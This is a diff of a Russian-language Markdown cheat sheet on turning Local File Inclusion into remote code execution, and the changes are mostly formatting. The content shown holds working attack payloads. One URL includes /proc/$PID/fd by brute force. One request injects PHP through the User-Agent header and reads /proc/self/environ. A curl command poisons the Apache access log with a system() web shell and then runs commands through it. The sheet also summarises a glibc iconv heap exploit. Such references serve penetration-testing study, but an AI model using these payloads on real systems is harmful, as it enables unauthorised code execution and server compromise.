@@ -1,39 +1,37 @@
 > **LFI (Local File Inclusion)** - это уязвимость, которая возникает, когда веб-приложение включает файлы из локальной файловой системы, часто из-за небезопасной обработки пользовательского ввода.
 >> Если пользователь может контролировать путь к файлу, он потенциально может включить конфиденциальные или опасные файлы, такие как системные файлы (/etc/passwd), конфигурационные файлы или даже вредоносные файлы, что может привести к удаленному выполнению кода (RCE).
 
+* [LFI в RCE через /proc/*/fd](#LFI-в-RCE-через-procfd)
+* [LFI в RCE через /proc/self/environ](#LFI-в-RCE-через-procselfenviron)
+* [LFI в RCE через iconv](#LFI-в-RCE-через-iconv)
+* [LFI в RCE через загрузку файлов](#LFI-в-RCE-через-загрузку-файлов)
+* [LFI в RCE через raceCondition](#LFI-в-RCE-через-raceCondition)
+* [LFI в RCE через загрузку (FindFirstFile)](#LFI-в-RCE-через-загрузку-FindFirstFile)
+* [LFI в RCE через phpinfo()](#LFI-в-RCE-через-phpinfo)
+* [LFI в RCE через контролируемый лог-файл](#LFI-в-RCE-через-контролируемый-лог-файл)
+* [RCE через SSH](#RCE-через-SSH)
+* [RCE через почту](#RCE-через-почту)
+* [RCE через логи Apache](#RCE-через-логи-Apache)
+* [LFI в RCE через PHP сессии](#LFI-в-RCE-через-PHP-сессии)
+* [LFI в RCE через PHP PEARCMD](#LFI-в-RCE-через-PHP-PEARCMD)
+* [LFI в RCE через файлы учетных данных](#LFI-в-RCE-через-файлы-учетных-данных)
 
-LFI в RCE через /proc/*/fd
-LFI в RCE через /proc/self/environ
-LFI в RCE через iconv
-LFI в RCE через загрузку файлов
-LFI в RCE через raceCondition
-LFI в RCE через загрузку (FindFirstFile)
-LFI в RCE через phpinfo()
-LFI в RCE через контролируемый лог-файл
-RCE через SSH
-RCE через почту
-RCE через логи Apache
-LFI в RCE через PHP сессии
-LFI в RCE через PHP PEARCMD
-LFI в RCE через файлы учетных данных
-LFI в RCE через /proc/*/fd
+# LFI в RCE через /proc/*/fd
 
-    Загрузите множество шеллов (например: 100)
+1. Загрузи множество шеллов (например: 100)
+2. Включи ```/proc/$PID/fd/$FD```, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
 
-    Включите /proc/$PID/fd/$FD, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
-
-```
+```bash
 http://example.com/index.php?page=/proc/$PID/fd/$FD
 ```
 
 # LFI в RCE через /proc/self/environ
 
 Как и с лог-файлом, отправьте полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ
-text
-
+```url
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
-
+```
 # LFI в RCE через iconv
 
 Используйте обертку iconv для запуска OOB в glibc (CVE-2024-2961), затем используйте LFI для чтения областей памяти из /proc/self/maps и загрузки бинарного файла glibc. В итоге вы получаете RCE, эксплуатируя структуру zend_mm_heap для вызова free(), который был переназначен на system с использованием custom_heap._free.
@@ -188,7 +186,7 @@ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 
 Затем запросите логи через LFI и выполните вашу команду.
 
-```bash
+```python
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
@@ -196,7 +194,7 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 
 Проверьте, использует ли сайт PHP Session (PHPSESSID)
 
-```
+```bash
 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
